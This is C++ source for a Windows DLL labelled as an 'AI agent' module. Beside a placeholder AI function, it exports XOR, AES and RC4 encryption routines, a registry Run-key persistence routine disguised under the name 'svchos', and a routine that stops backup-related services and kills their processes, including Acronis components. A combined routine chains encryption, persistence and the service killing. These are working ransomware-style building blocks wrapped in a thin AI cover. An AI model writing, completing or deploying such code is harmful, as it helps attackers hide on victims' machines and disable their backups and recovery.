// nsfw_dll.cpp
#include <windows.h>
#include <wincrypt.h>
#include <tlhelp32.h>
#include <vector>
#include <string>
#include <iostream>
#include <fstream>
#include <cstring>

// ==================== AI AGENT LOGIC ====================
// Placeholder for your previous AI agent logic
std::string process_input(const std::string& input) {
    // Replace this with your actual AI logic
    return "Processed: " + input;
}

// ==================== ENCRYPTION FUNCTIONS ====================

// XOR Encryption
extern "C" __declspec(dllexport) void xor_encrypt(char* data, size_t length, const char* key, size_t key_len) {
    for (size_t i = 0; i < length; ++i) {
        data[i] ^= key[i % key_len];
    }
}

// AES Encryption (Windows CryptoAPI)
extern "C" __declspec(dllexport) bool aes_encrypt(const BYTE* data, DWORD dataLen, BYTE* key, DWORD keyLen, BYTE* out, DWORD* outLen) {
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    HCRYPTHASH hHash = 0;
    bool success = false;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return false;
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) goto cleanup;

    CryptHashData(hHash, key, keyLen, 0);
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) goto cleanup;

    DWORD len = dataLen;
    memcpy(out, data, dataLen);
    if (CryptEncrypt(hKey, 0, TRUE, 0, out, &len, *outLen)) {
        *outLen = len;
        success = true;
    }

cleanup:
    if (hHash) CryptDestroyHash(hHash);
    if (hKey) CryptDestroyKey(hKey);
    if (hProv) CryptReleaseContext(hProv, 0);
    return success;
}

// RC4 Encryption
extern "C" __declspec(dllexport) void rc4_encrypt(BYTE* data, DWORD dataLen, BYTE* key, DWORD keyLen) {
    BYTE S[256], K[256];
    int i, j = 0, t;
    BYTE temp;

    for (i = 0; i < 256; i++) {
        S[i] = i;
        K[i] = key[i % keyLen];
    }

    for (i = 0; i < 256; i++) {
        j = (j + S[i] + K[i]) % 256;
        temp = S[i];
        S[i] = S[j];
        S[j] = temp;
    }

    i = j = 0;
    for (DWORD x = 0; x < dataLen; x++) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        temp = S[i];
        S[i] = S[j];
        S[j] = temp;
        t = (S[i] + S[j]) % 256;
        data[x] ^= S[t];
    }
}

// ==================== REGISTRY PERSISTENCE ====================
extern "C" __declspec(dllexport) bool add_persistence(const std::wstring& exePath) {
    HKEY hKey;
    LPCWSTR regPath = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    LPCWSTR valueName = L"svchos";
    LONG lResult = RegOpenKeyExW(HKEY_CURRENT_USER, regPath, 0, KEY_WRITE, &hKey);
    if (lResult != ERROR_SUCCESS) return false;
    lResult = RegSetValueExW(hKey, valueName, 0, REG_SZ, (const BYTE*)exePath.c_str(), (exePath.size() + 1) * sizeof(wchar_t));
    RegCloseKey(hKey);
    return lResult == ERROR_SUCCESS;
}

// ==================== KILL SERVICES / PROCESSES ====================
std::vector<std::wstring> serviceNames = { L"Acronis VSS Provider", L"Enterprise Client Service" /* Add others */ };
std::vector<std::wstring> processNames = { L"AcronisAgent.exe", L"bedbg.exe" /* Add others */ };

extern "C" __declspec(dllexport) void kill_services_and_processes() {
    // Stop services
    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (scm) {
        for (auto& svc : serviceNames) {
            SC_HANDLE schService = OpenServiceW(scm, svc.c_str(), SERVICE_STOP | SERVICE_QUERY_STATUS);
            if (schService) {
                SERVICE_STATUS_PROCESS ssp;
                DWORD bytesNeeded;
                ControlService(schService, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&ssp);
                CloseServiceHandle(schService);
            }
        }
        CloseServiceHandle(scm);
    }

    // Kill processes
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(PROCESSENTRY32W);
        if (Process32FirstW(hSnap, &pe)) {
            do {
                for (auto& proc : processNames) {
                    if (_wcsicmp(pe.szExeFile, proc.c_str()) == 0) {
                        HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                        if (hProc) {
                            TerminateProcess(hProc, 1);
                            CloseHandle(hProc);
                        }
                    }
                }
            } while (Process32NextW(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }
}

// ==================== DLL EXPORTS ====================

// AI processing only
extern "C" __declspec(dllexport) void agent_process(const char* input, char* output, size_t output_len) {
    std::string result = process_input(std::string(input));
    strncpy(output, result.c_str(), output_len - 1);
    output[output_len - 1] = '\0';
}

// AI + XOR encryption
extern "C" __declspec(dllexport) void agent_process_and_encrypt(const char* input, char* output, size_t output_len, const char* key, size_t key_len) {
    agent_process(input, output, output_len);
    xor_encrypt(output, strlen(output), key, key_len);
}

// Full routine: AI + encryption + persistence + cleanup
extern "C" __declspec(dllexport) void agent_full_routine(const char* input, char* output, size_t output_len) {
    agent_process(input, output, output_len);

    // Example XOR encryption
    const char* key = "mykey123";
    xor_encrypt(output, strlen(output), key, strlen(key));

    // Add registry persistence
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    add_persistence(exePath);

    // Kill blacklisted services/processes
    kill_services_and_processes();
}

// DLL Entry Point
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
